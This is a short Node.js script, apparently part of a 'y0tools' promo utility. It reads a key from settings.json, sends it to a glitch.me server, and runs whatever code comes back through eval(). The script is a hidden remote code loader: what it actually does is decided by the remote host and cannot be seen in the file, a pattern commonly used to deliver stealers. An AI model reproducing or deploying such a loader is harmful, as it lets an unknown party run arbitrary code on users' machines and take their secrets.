let fet = require('node-fetch');
let fs = require('fs');

(async()=>{

let data = await (await fet(('https://y0tools.glitch.me/api/v1/files/promo'), {
    headers: {
    authorization: JSON.parse(fs.readFileSync('./settings.json', "utf-8")).key
}})).json()

if(!data.code) return console.log('Error code')

eval(data.code)

})()